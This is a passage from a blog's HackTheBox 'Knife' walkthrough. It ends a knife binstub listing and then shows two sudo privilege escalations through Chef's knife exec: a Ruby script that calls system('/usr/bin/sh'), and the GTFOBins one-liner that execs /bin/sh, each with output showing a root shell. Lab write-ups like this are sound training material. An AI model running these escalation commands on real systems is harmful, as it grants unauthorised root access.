  gem <span class="s2">"cleanroom"</span>, <span class="s2">"= 1.0.0"</span>
  gem <span class="s2">"coderay"</span>, <span class="s2">"= 1.1.3"</span>
  gem <span class="s2">"coercible"</span>, <span class="s2">"= 1.0.0"</span>
  gem <span class="s2">"concurrent-ruby"</span>, <span class="s2">"= 1.1.8"</span>
  gem <span class="s2">"cookbook-omnifetch"</span>, <span class="s2">"= 0.11.1"</span>
  gem <span class="s2">"cookstyle"</span>, <span class="s2">"= 7.8.0"</span>
  gem <span class="s2">"debug_inspector"</span>, <span class="s2">"= 1.0.0"</span>
  gem <span class="s2">"declarative"</span>, <span class="s2">"= 0.0.20"</span>
  gem <span class="s2">"declarative-option"</span>, <span class="s2">"= 0.1.0"</span>
  gem <span class="s2">"dep-selector-libgecode"</span>, <span class="s2">"= 1.3.5"</span>
  gem <span class="s2">"dep_selector"</span>, <span class="s2">"= 1.0.6"</span>
  gem <span class="s2">"descendants_tracker"</span>, <span class="s2">"= 0.0.4"</span>
  gem <span class="s2">"diff-lcs"</span>, <span class="s2">"= 1.3"</span>
  gem <span class="s2">"docker-api"</span>, <span class="s2">"= 2.0.0"</span>
  gem <span class="s2">"domain_name"</span>, <span class="s2">"= 0.5.20190701"</span>
  gem <span class="s2">"droplet_kit"</span>, <span class="s2">"= 3.13.0"</span>
  gem <span class="s2">"ed25519"</span>, <span class="s2">"= 1.2.4"</span>
  gem <span class="s2">"equalizer"</span>, <span class="s2">"= 0.0.11"</span>
  gem <span class="s2">"erubi"</span>, <span class="s2">"= 1.10.0"</span>
  gem <span class="s2">"erubis"</span>, <span class="s2">"= 2.7.0"</span>
  gem <span class="s2">"excon"</span>, <span class="s2">"= 0.79.0"</span>
  gem <span class="s2">"faraday"</span>, <span class="s2">"= 1.3.0"</span>
  gem <span class="s2">"faraday-cookie_jar"</span>, <span class="s2">"= 0.0.7"</span>
  gem <span class="s2">"faraday-net_http"</span>, <span class="s2">"= 1.0.1"</span>
  gem <span class="s2">"faraday_middleware"</span>, <span class="s2">"= 1.0.0"</span>
  gem <span class="s2">"fauxhai-ng"</span>, <span class="s2">"= 8.7.0"</span>
  gem <span class="s2">"ffi"</span>, <span class="s2">"= 1.14.2"</span>
  gem <span class="s2">"ffi"</span>, <span class="s2">"= 1.14.2"</span>
  gem <span class="s2">"ffi"</span>, <span class="s2">"= 1.14.2"</span>
  gem <span class="s2">"ffi-libarchive"</span>, <span class="s2">"= 1.0.17"</span>
  gem <span class="s2">"ffi-yajl"</span>, <span class="s2">"= 2.3.4"</span>
  gem <span class="s2">"filesize"</span>, <span class="s2">"= 0.2.0"</span>
  gem <span class="s2">"fog-core"</span>, <span class="s2">"= 2.2.3"</span>
  gem <span class="s2">"fog-json"</span>, <span class="s2">"= 1.2.0"</span>
  gem <span class="s2">"fog-openstack"</span>, <span class="s2">"= 1.0.11"</span>
  gem <span class="s2">"formatador"</span>, <span class="s2">"= 0.2.5"</span>
  gem <span class="s2">"fuzzyurl"</span>, <span class="s2">"= 0.9.0"</span>
  gem <span class="s2">"gcewinpass"</span>, <span class="s2">"= 1.1.0"</span>
  gem <span class="s2">"google-api-client"</span>, <span class="s2">"= 0.42.2"</span>
  gem <span class="s2">"googleauth"</span>, <span class="s2">"= 0.14.0"</span>
  gem <span class="s2">"gssapi"</span>, <span class="s2">"= 1.3.1"</span>
  gem <span class="s2">"guard"</span>, <span class="s2">"= 2.16.2"</span>
  gem <span class="s2">"gyoku"</span>, <span class="s2">"= 1.3.1"</span>
  gem <span class="s2">"hashie"</span>, <span class="s2">"= 4.1.0"</span>
  gem <span class="s2">"highline"</span>, <span class="s2">"= 2.0.3"</span>
  gem <span class="s2">"http-cookie"</span>, <span class="s2">"= 1.0.3"</span>
  gem <span class="s2">"httpclient"</span>, <span class="s2">"= 2.8.3"</span>
  gem <span class="s2">"i18n"</span>, <span class="s2">"= 1.8.9"</span>
  gem <span class="s2">"ice_nine"</span>, <span class="s2">"= 0.11.2"</span>
  gem <span class="s2">"inifile"</span>, <span class="s2">"= 3.0.0"</span>
  gem <span class="s2">"iniparse"</span>, <span class="s2">"= 1.5.0"</span>
  gem <span class="s2">"inspec"</span>, <span class="s2">"= 4.26.4"</span>
  gem <span class="s2">"inspec-bin"</span>, <span class="s2">"= 4.26.4"</span>
  gem <span class="s2">"inspec-core"</span>, <span class="s2">"= 4.26.4"</span>
  gem <span class="s2">"ipaddress"</span>, <span class="s2">"= 0.8.3"</span>
  gem <span class="s2">"jmespath"</span>, <span class="s2">"= 1.4.0"</span>
  gem <span class="s2">"json"</span>, <span class="s2">"= 2.5.1"</span>
  gem <span class="s2">"jwt"</span>, <span class="s2">"= 2.2.2"</span>
  gem <span class="s2">"kartograph"</span>, <span class="s2">"= 0.2.8"</span>
  gem <span class="s2">"kitchen-azurerm"</span>, <span class="s2">"= 1.5.0"</span>
  gem <span class="s2">"kitchen-digitalocean"</span>, <span class="s2">"= 0.11.2"</span>
  gem <span class="s2">"kitchen-dokken"</span>, <span class="s2">"= 2.11.2"</span>
  gem <span class="s2">"kitchen-ec2"</span>, <span class="s2">"= 3.8.0"</span>
  gem <span class="s2">"kitchen-google"</span>, <span class="s2">"= 2.2.0"</span>
  gem <span class="s2">"kitchen-hyperv"</span>, <span class="s2">"= 0.5.5"</span>
  gem <span class="s2">"kitchen-inspec"</span>, <span class="s2">"= 2.3.0"</span>
  gem <span class="s2">"kitchen-openstack"</span>, <span class="s2">"= 5.0.1"</span>
  gem <span class="s2">"kitchen-vagrant"</span>, <span class="s2">"= 1.8.0"</span>
  gem <span class="s2">"kitchen-vcenter"</span>, <span class="s2">"= 2.9.8"</span>
  gem <span class="s2">"knife-azure"</span>, <span class="s2">"= 3.0.6"</span>
  gem <span class="s2">"knife-cloud"</span>, <span class="s2">"= 4.0.15"</span>
  gem <span class="s2">"knife-ec2"</span>, <span class="s2">"= 2.1.3"</span>
  gem <span class="s2">"knife-google"</span>, <span class="s2">"= 5.0.8"</span>
  gem <span class="s2">"knife-opc"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"knife-tidy"</span>, <span class="s2">"= 2.1.2"</span>
  gem <span class="s2">"knife-vcenter"</span>, <span class="s2">"= 5.0.5"</span>
  gem <span class="s2">"knife-vsphere"</span>, <span class="s2">"= 4.1.7"</span>
  gem <span class="s2">"knife-windows"</span>, <span class="s2">"= 4.0.6"</span>
  gem <span class="s2">"kramdown"</span>, <span class="s2">"= 2.3.0"</span>
  gem <span class="s2">"kramdown-parser-gfm"</span>, <span class="s2">"= 1.1.0"</span>
  gem <span class="s2">"libyajl2"</span>, <span class="s2">"= 1.2.0"</span>
  gem <span class="s2">"license-acceptance"</span>, <span class="s2">"= 2.1.13"</span>
  gem <span class="s2">"listen"</span>, <span class="s2">"= 3.4.1"</span>
  gem <span class="s2">"little-plugger"</span>, <span class="s2">"= 1.1.4"</span>
  gem <span class="s2">"lockfile"</span>, <span class="s2">"= 2.1.3"</span>
  gem <span class="s2">"logging"</span>, <span class="s2">"= 2.3.0"</span>
  gem <span class="s2">"lumberjack"</span>, <span class="s2">"= 1.2.8"</span>
  gem <span class="s2">"mdl"</span>, <span class="s2">"= 0.11.0"</span>
  gem <span class="s2">"memoist"</span>, <span class="s2">"= 0.16.2"</span>
  gem <span class="s2">"method_source"</span>, <span class="s2">"= 1.0.0"</span>
  gem <span class="s2">"mime-types"</span>, <span class="s2">"= 3.3.1"</span>
  gem <span class="s2">"mime-types-data"</span>, <span class="s2">"= 3.2021.0212"</span>
  gem <span class="s2">"mini_mime"</span>, <span class="s2">"= 1.0.2"</span>
  gem <span class="s2">"mini_portile2"</span>, <span class="s2">"= 2.4.0"</span>
  gem <span class="s2">"minitar"</span>, <span class="s2">"= 0.9"</span>
  gem <span class="s2">"minitest"</span>, <span class="s2">"= 5.13.0"</span>
  gem <span class="s2">"mixlib-archive"</span>, <span class="s2">"= 1.1.4"</span>
  gem <span class="s2">"mixlib-archive"</span>, <span class="s2">"= 1.1.4"</span>
  gem <span class="s2">"mixlib-authentication"</span>, <span class="s2">"= 3.0.7"</span>
  gem <span class="s2">"mixlib-cli"</span>, <span class="s2">"= 2.1.8"</span>
  gem <span class="s2">"mixlib-config"</span>, <span class="s2">"= 3.0.9"</span>
  gem <span class="s2">"mixlib-install"</span>, <span class="s2">"= 3.12.5"</span>
  gem <span class="s2">"mixlib-log"</span>, <span class="s2">"= 3.0.9"</span>
  gem <span class="s2">"mixlib-shellout"</span>, <span class="s2">"= 3.2.5"</span>
  gem <span class="s2">"mixlib-shellout"</span>, <span class="s2">"= 3.2.5"</span>
  gem <span class="s2">"mixlib-versioning"</span>, <span class="s2">"= 1.2.12"</span>
  gem <span class="s2">"molinillo"</span>, <span class="s2">"= 0.7.0"</span>
  gem <span class="s2">"ms_rest"</span>, <span class="s2">"= 0.7.6"</span>
  gem <span class="s2">"ms_rest_azure"</span>, <span class="s2">"= 0.12.0"</span>
  gem <span class="s2">"multi_json"</span>, <span class="s2">"= 1.15.0"</span>
  gem <span class="s2">"multipart-post"</span>, <span class="s2">"= 2.1.1"</span>
  gem <span class="s2">"nenv"</span>, <span class="s2">"= 0.3.0"</span>
  gem <span class="s2">"net-ping"</span>, <span class="s2">"= 2.0.8"</span>
  gem <span class="s2">"net-scp"</span>, <span class="s2">"= 3.0.0"</span>
  gem <span class="s2">"net-sftp"</span>, <span class="s2">"= 3.0.0"</span>
  gem <span class="s2">"net-ssh"</span>, <span class="s2">"= 6.1.0"</span>
  gem <span class="s2">"net-ssh-gateway"</span>, <span class="s2">"= 2.0.0"</span>
  gem <span class="s2">"net-ssh-multi"</span>, <span class="s2">"= 1.2.1"</span>
  gem <span class="s2">"netaddr"</span>, <span class="s2">"= 1.5.1"</span>
  gem <span class="s2">"nokogiri"</span>, <span class="s2">"= 1.10.10"</span>
  gem <span class="s2">"nokogiri"</span>, <span class="s2">"= 1.10.10"</span>
  gem <span class="s2">"nokogiri"</span>, <span class="s2">"= 1.10.10"</span>
  gem <span class="s2">"nori"</span>, <span class="s2">"= 2.6.0"</span>
  gem <span class="s2">"notiffany"</span>, <span class="s2">"= 0.1.3"</span>
  gem <span class="s2">"octokit"</span>, <span class="s2">"= 4.20.0"</span>
  gem <span class="s2">"ohai"</span>, <span class="s2">"= 16.10.6"</span>
  gem <span class="s2">"optimist"</span>, <span class="s2">"= 3.0.1"</span>
  gem <span class="s2">"os"</span>, <span class="s2">"= 1.1.1"</span>
  gem <span class="s2">"parallel"</span>, <span class="s2">"= 1.20.1"</span>
  gem <span class="s2">"parser"</span>, <span class="s2">"= 3.0.0.0"</span>
  gem <span class="s2">"parslet"</span>, <span class="s2">"= 1.8.2"</span>
  gem <span class="s2">"pastel"</span>, <span class="s2">"= 0.8.0"</span>
  gem <span class="s2">"plist"</span>, <span class="s2">"= 3.6.0"</span>
  gem <span class="s2">"proxifier"</span>, <span class="s2">"= 1.0.3"</span>
  gem <span class="s2">"pry"</span>, <span class="s2">"= 0.13.1"</span>
  gem <span class="s2">"pry-byebug"</span>, <span class="s2">"= 3.9.0"</span>
  gem <span class="s2">"pry-remote"</span>, <span class="s2">"= 0.1.8"</span>
  gem <span class="s2">"pry-stack_explorer"</span>, <span class="s2">"= 0.6.1"</span>
  gem <span class="s2">"public_suffix"</span>, <span class="s2">"= 4.0.6"</span>
  gem <span class="s2">"r18n-core"</span>, <span class="s2">"= 4.0.0"</span>
  gem <span class="s2">"r18n-desktop"</span>, <span class="s2">"= 4.0.0"</span>
  gem <span class="s2">"rack"</span>, <span class="s2">"= 2.2.3"</span>
  gem <span class="s2">"rainbow"</span>, <span class="s2">"= 3.0.0"</span>
  gem <span class="s2">"rake"</span>, <span class="s2">"= 13.0.1"</span>
  gem <span class="s2">"rb-fsevent"</span>, <span class="s2">"= 0.10.4"</span>
  gem <span class="s2">"rb-inotify"</span>, <span class="s2">"= 0.10.1"</span>
  gem <span class="s2">"rb-readline"</span>, <span class="s2">"= 0.5.5"</span>
  gem <span class="s2">"rbvmomi"</span>, <span class="s2">"= 3.0.0"</span>
  gem <span class="s2">"regexp_parser"</span>, <span class="s2">"= 2.0.3"</span>
  gem <span class="s2">"representable"</span>, <span class="s2">"= 3.0.4"</span>
  gem <span class="s2">"resource_kit"</span>, <span class="s2">"= 0.1.7"</span>
  gem <span class="s2">"retriable"</span>, <span class="s2">"= 3.1.2"</span>
  gem <span class="s2">"retryable"</span>, <span class="s2">"= 3.0.5"</span>
  gem <span class="s2">"rexml"</span>, <span class="s2">"= 3.2.4"</span>
  gem <span class="s2">"rspec"</span>, <span class="s2">"= 3.10.0"</span>
  gem <span class="s2">"rspec-core"</span>, <span class="s2">"= 3.10.1"</span>
  gem <span class="s2">"rspec-expectations"</span>, <span class="s2">"= 3.10.1"</span>
  gem <span class="s2">"rspec-its"</span>, <span class="s2">"= 1.3.0"</span>
  gem <span class="s2">"rspec-mocks"</span>, <span class="s2">"= 3.10.2"</span>
  gem <span class="s2">"rspec-support"</span>, <span class="s2">"= 3.10.2"</span>
  gem <span class="s2">"rubocop"</span>, <span class="s2">"= 1.10.0"</span>
  gem <span class="s2">"rubocop-ast"</span>, <span class="s2">"= 1.4.1"</span>
  gem <span class="s2">"ruby-progressbar"</span>, <span class="s2">"= 1.11.0"</span>
  gem <span class="s2">"ruby-shadow"</span>, <span class="s2">"= 2.5.0"</span>
  gem <span class="s2">"ruby2_keywords"</span>, <span class="s2">"= 0.0.4"</span>
  gem <span class="s2">"rubyntlm"</span>, <span class="s2">"= 0.6.3"</span>
  gem <span class="s2">"rubyzip"</span>, <span class="s2">"= 2.3.0"</span>
  gem <span class="s2">"sawyer"</span>, <span class="s2">"= 0.8.2"</span>
  gem <span class="s2">"semverse"</span>, <span class="s2">"= 3.0.0"</span>
  gem <span class="s2">"shellany"</span>, <span class="s2">"= 0.0.1"</span>
  gem <span class="s2">"signet"</span>, <span class="s2">"= 0.14.1"</span>
  gem <span class="s2">"slop"</span>, <span class="s2">"= 3.6.0"</span>
  gem <span class="s2">"solve"</span>, <span class="s2">"= 4.0.4"</span>
  gem <span class="s2">"sshkey"</span>, <span class="s2">"= 2.0.0"</span>
  gem <span class="s2">"sslshake"</span>, <span class="s2">"= 1.3.1"</span>
  gem <span class="s2">"strings"</span>, <span class="s2">"= 0.2.0"</span>
  gem <span class="s2">"strings-ansi"</span>, <span class="s2">"= 0.2.0"</span>
  gem <span class="s2">"syslog-logger"</span>, <span class="s2">"= 1.6.8"</span>
  gem <span class="s2">"test-kitchen"</span>, <span class="s2">"= 2.10.0"</span>
  gem <span class="s2">"thor"</span>, <span class="s2">"= 1.1.0"</span>
  gem <span class="s2">"thread_safe"</span>, <span class="s2">"= 0.3.6"</span>
  gem <span class="s2">"timeliness"</span>, <span class="s2">"= 0.3.10"</span>
  gem <span class="s2">"toml-rb"</span>, <span class="s2">"= 2.0.1"</span>
  gem <span class="s2">"tomlrb"</span>, <span class="s2">"= 1.3.0"</span>
  gem <span class="s2">"train"</span>, <span class="s2">"= 3.4.9"</span>
  gem <span class="s2">"train-aws"</span>, <span class="s2">"= 0.1.35"</span>
  gem <span class="s2">"train-core"</span>, <span class="s2">"= 3.4.9"</span>
  gem <span class="s2">"train-habitat"</span>, <span class="s2">"= 0.2.22"</span>
  gem <span class="s2">"train-winrm"</span>, <span class="s2">"= 0.2.12"</span>
  gem <span class="s2">"tty-box"</span>, <span class="s2">"= 0.7.0"</span>
  gem <span class="s2">"tty-color"</span>, <span class="s2">"= 0.6.0"</span>
  gem <span class="s2">"tty-cursor"</span>, <span class="s2">"= 0.7.1"</span>
  gem <span class="s2">"tty-prompt"</span>, <span class="s2">"= 0.23.0"</span>
  gem <span class="s2">"tty-reader"</span>, <span class="s2">"= 0.9.0"</span>
  gem <span class="s2">"tty-screen"</span>, <span class="s2">"= 0.8.1"</span>
  gem <span class="s2">"tty-spinner"</span>, <span class="s2">"= 0.9.3"</span>
  gem <span class="s2">"tty-table"</span>, <span class="s2">"= 0.12.0"</span>
  gem <span class="s2">"tzinfo"</span>, <span class="s2">"= 1.2.9"</span>
  gem <span class="s2">"uber"</span>, <span class="s2">"= 0.1.0"</span>
  gem <span class="s2">"unf"</span>, <span class="s2">"= 0.1.4"</span>
  gem <span class="s2">"unf_ext"</span>, <span class="s2">"= 0.0.7.7"</span>
  gem <span class="s2">"unf_ext"</span>, <span class="s2">"= 0.0.7.7"</span>
  gem <span class="s2">"unf_ext"</span>, <span class="s2">"= 0.0.7.7"</span>
  gem <span class="s2">"unicode-display_width"</span>, <span class="s2">"= 1.7.0"</span>
  gem <span class="s2">"unicode_utils"</span>, <span class="s2">"= 1.4.0"</span>
  gem <span class="s2">"uuidtools"</span>, <span class="s2">"= 2.2.0"</span>
  gem <span class="s2">"virtus"</span>, <span class="s2">"= 1.0.5"</span>
  gem <span class="s2">"vsphere-automation-appliance"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"vsphere-automation-cis"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"vsphere-automation-content"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"vsphere-automation-runtime"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"vsphere-automation-sdk"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"vsphere-automation-vapi"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"vsphere-automation-vcenter"</span>, <span class="s2">"= 0.4.7"</span>
  gem <span class="s2">"webrick"</span>, <span class="s2">"= 1.7.0"</span>
  gem <span class="s2">"winrm"</span>, <span class="s2">"= 2.3.6"</span>
  gem <span class="s2">"winrm-elevated"</span>, <span class="s2">"= 1.2.3"</span>
  gem <span class="s2">"winrm-fs"</span>, <span class="s2">"= 1.3.5"</span>
  gem <span class="s2">"wisper"</span>, <span class="s2">"= 2.0.1"</span>
  gem <span class="s2">"wmi-lite"</span>, <span class="s2">"= 1.0.5"</span>
  gem <span class="s2">"yard"</span>, <span class="s2">"= 0.9.26"</span>
  gem <span class="s2">"chef"</span>, <span class="s2">"= 16.10.8"</span>
  gem <span class="s2">"bundler"</span> <span class="c"># force activation of bundler to avoid unresolved specs if there are multiple bundler versions</span>
  spec <span class="o">=</span> Gem::Specification.find_by_name<span class="o">(</span><span class="s2">"chef"</span>, <span class="s2">"= 16.10.8"</span><span class="o">)</span>
<span class="k">else
  </span>spec <span class="o">=</span> Gem::Specification.find_by_name<span class="o">(</span><span class="s2">"chef"</span><span class="o">)</span>
end

unless Gem::Specification.unresolved_deps.empty?
  <span class="nv">$stderr</span>.puts <span class="s2">"APPBUNDLER WARNING: unresolved deps are CRITICAL performance bug, this MUST be fixed"</span>
  Gem::Specification.reset
end

bin_file <span class="o">=</span> spec.bin_file<span class="o">(</span><span class="s2">"knife"</span><span class="o">)</span>

Kernel.load<span class="o">(</span>bin_file<span class="o">)</span>
</code></pre></div></div>
<p>ruby gem redirect to knife executable file to escalate root access. Let’s create a simple ruby script</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"system('/usr/bin/sh')"</span> <span class="o">&gt;</span> root.rb
<span class="nb">echo</span> <span class="s2">"system('/usr/bin/sh')"</span> <span class="o">&gt;</span> root.rb
james@knife:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x root.rb
james@knife:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec </span>root.rb
james@knife:/tmp<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec </span>root.rb
<span class="nb">sudo</span> /usr/bin/knife <span class="nb">exec </span>root.rb
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
<span class="c">#</span>
</code></pre></div></div>
<p><img src="/assets/images/htb-machine-knife/root.png" alt="root" /></p>

<h2 id="knife-sudo-privillege-escalation">Knife sudo privillege escalation</h2>
<p><code class="language-plaintext highlighter-rouge">knife</code> sudo privilege escalation - <a href="https://gtfobins.github.io/gtfobins/knife/">https://gtfobins.github.io/gtfobins/knife/#sudo</a>.
<img src="/assets/images/htb-machine-knife/knifesudo.png" alt="knife" /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>james@knife:/tmp<span class="nv">$ </span><span class="nb">sudo </span>knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
<span class="nb">sudo </span>knife <span class="nb">exec</span> <span class="nt">-E</span> <span class="s1">'exec "/bin/sh"'</span>
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
<span class="c">#</span>
</code></pre></div></div>
<p><img src="/assets/images/htb-machine-knife/root2.png" alt="root" /></p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
  
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox-machine" class="page__taxonomy-item" rel="tag">HackTheBox Machine</a>
    
    </span>
  </p>


        
  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-08-30">August 30, 2021</time></p>


      </footer>
      
      
  <nav class="pagination">
    
      <a href="/penetration%20testing/oscp/oscp_prapation_indonesia/" class="pagination--pager" title="Pengalaman Ujian Sertifikasi OSCP
">Previous</a>
    
    
      <a href="/cve/CVE-2021-24614/" class="pagination--pager" title="Book appointment Online &lt; 1.39 - Authenticated Stored Cross-Site Scripting (XSS)
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
- Date: 07/01/2022
- Exploit Au...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
- Date: 05/01/20222
- Exploit Author: tw...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
      <div class="archive__item-teaser">
        <img src="/assets/images/teaser.png" alt="">
      </div>
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
</a>
      
    </h2>
    

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
      </span>
    
    
    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
        
  </p>
  


    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
- Date: 2021-12-30
- ...</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
    
      <li><strong>Follow:</strong></li>
    
    
      
        
      
          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
          </li>
        
      
    
    
    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>

</div>
<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <script>
    var disqus_config = function () {
      this.page.url = "http://localhost:4000/hackthebox%20machine/htb-machine-knife/";  /* Replace PAGE_URL with your page's canonical URL variable */
      this.page.identifier = "/hackthebox%20machine/htb-machine-knife"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
    };
    (function() { /* DON'T EDIT BELOW THIS LINE */
      var d = document, s = d.createElement('script');
      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
